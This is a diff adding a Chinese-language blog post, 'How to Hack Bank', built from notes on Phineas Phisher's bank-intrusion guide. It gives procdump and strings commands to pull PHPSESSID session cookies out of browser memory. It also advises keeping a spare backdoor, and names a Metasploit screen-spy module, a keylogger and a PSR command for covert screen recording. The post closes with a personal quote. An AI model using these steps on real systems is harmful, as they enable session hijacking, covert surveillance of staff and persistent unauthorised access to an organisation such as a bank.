@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>How to Hack Bank</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Study The World </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/hack-bank.html" rel="bookmark"
+           title="Permalink to How to Hack Bank">How to Hack Bank</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2020-04-22T00:00:00+02:00">
+                <a href='#'>04/22/2020 </a>
+                <a href="/category/fun.html">Fun</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>PS: 标题看上去很厉害-&gt; 金玉其外，败絮其中</p>
+<p>来源: <a href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
+<h3>从浏览器dump登陆Cookie</h3>
+<div class="highlight"><pre><span></span><span class="n">procdump64</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">ma</span> <span class="n">PID_of_browser</span>
+<span class="n">strings64</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">*</span> <span class="p">.</span><span class="n">dmp</span> <span class="o">|</span> <span class="n">findstr</span> <span class="n">PHPSESSID</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="n">nul</span>
+<span class="n">findstr</span> <span class="n">PHPSESSID</span> <span class="o">*</span> <span class="p">.</span><span class="n">dmp</span><span class="o">&gt;</span> <span class="n">tmp</span>
+<span class="n">strings64</span> <span class="o">/</span><span class="n">accepteula</span> <span class="n">tmp</span> <span class="o">|</span> <span class="n">findstr</span> <span class="n">PHPSESSID</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="n">nul</span>
+</pre></div>
+
+
+<h3>准备个后路</h3>
+<ol>
+<li>经常用来操作的access放在一个地方</li>
+<li>留一个备用的，不用的后门</li>
+</ol>
+<h3>知己知彼</h3>
+<p>收集信息用到一下模块:</p>
+<div class="highlight"><pre><span></span><span class="err">每</span><span class="mi">5</span><span class="n">s截屏</span><span class="o">:</span>
+<span class="n">post</span><span class="sr">/windows/gather/s</span><span class="n">creen_spy</span>
+
+<span class="err">再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。</span>
+
+
+<span class="err">另外</span><span class="n">windows下有一个比较好用的监视器</span><span class="o">:</span> <span class="n">PSR</span>
+
+
+<span class="n">psr</span><span class="o">.</span><span class="na">exe</span> <span class="sr">/start /gui 0 /</span><span class="n">output</span> <span class="n">C</span><span class="o">:\</span><span class="n">Users</span><span class="o">\</span><span class="n">Dan</span><span class="o">\</span><span class="n">Desktop</span><span class="o">\</span><span class="n">cool</span><span class="o">.</span><span class="na">zip</span><span class="o">;</span>
+<span class="n">Start</span><span class="o">-</span><span class="n">Sleep</span> <span class="o">-</span><span class="n">s</span> <span class="mi">20</span><span class="o">;</span>
+<span class="n">psr</span><span class="o">.</span><span class="na">exe</span> <span class="o">/</span><span class="n">stop</span><span class="o">;</span>
+</pre></div>
+
+
+<p><a href="https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/">https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/</a></p>
+<h2>END</h2>
+<div class="highlight"><pre><span></span><span class="nv">Hacking</span> <span class="nv">has</span> <span class="nv">made</span> <span class="nv">me</span> <span class="nv">feel</span> <span class="nv">alive</span>. <span class="nv">It</span> <span class="nv">started</span> <span class="nv">as</span> <span class="nv">a</span> <span class="nv">way</span> <span class="nv">to</span> <span class="nv">self</span><span class="o">-</span><span class="nv">medicate</span> <span class="nv">depression</span>. <span class="nv">Later</span> <span class="nv">I</span> <span class="nv">realized</span> <span class="nv">that</span>, <span class="nv">in</span> <span class="nv">reality</span>, <span class="nv">I</span> <span class="nv">could</span> <span class="k">do</span> <span class="nv">something</span> <span class="nv">positive</span>. <span class="nv">I</span> <span class="nv">don</span><span class="s1">&#39;</span><span class="s">t regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn</span><span class="s1">&#39;</span><span class="nv">t</span> <span class="k">continue</span> <span class="nv">living</span> <span class="nv">that</span> <span class="nv">way</span>. <span class="nv">So</span> <span class="nv">I</span> <span class="nv">began</span> <span class="nv">to</span> <span class="nv">spend</span> <span class="nv">more</span> <span class="nv">time</span> <span class="nv">away</span> <span class="nv">from</span> <span class="nv">my</span> <span class="nv">computer</span>, <span class="nv">with</span> <span class="nv">other</span> <span class="nv">people</span>, <span class="nv">learning</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">myself</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">world</span>, <span class="nv">to</span> <span class="nv">feel</span> <span class="nv">my</span> <span class="nv">emotions</span>, <span class="nv">to</span> <span class="k">connect</span> <span class="nv">with</span> <span class="nv">others</span>, <span class="nv">to</span> <span class="nv">accept</span> <span class="nv">risks</span> <span class="nv">and</span> <span class="nv">be</span> <span class="nv">vulnerable</span>. <span class="nv">Things</span> <span class="nv">much</span> <span class="nv">harder</span> <span class="nv">than</span> <span class="nv">hacking</span>, <span class="nv">but</span> <span class="nv">at</span> <span class="nv">the</span> <span class="nv">mere</span> <span class="nv">hour</span> <span class="nv">the</span> <span class="nv">reward</span> <span class="nv">is</span> <span class="nv">more</span> <span class="nv">worth</span> <span class="nv">it</span>. <span class="nv">It</span> <span class="nv">is</span> <span class="nv">still</span> <span class="nv">an</span> <span class="nv">effort</span>, <span class="nv">but</span> <span class="nv">even</span> <span class="k">if</span> <span class="nv">it</span> <span class="nv">is</span> <span class="nv">slow</span> <span class="nv">and</span> <span class="nv">wobbly</span>, <span class="nv">I</span> <span class="nv">feel</span> <span class="nv">that</span> <span class="nv">I</span> <span class="nv">am</span> <span class="nv">on</span> <span class="nv">my</span> <span class="nv">way</span>.
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
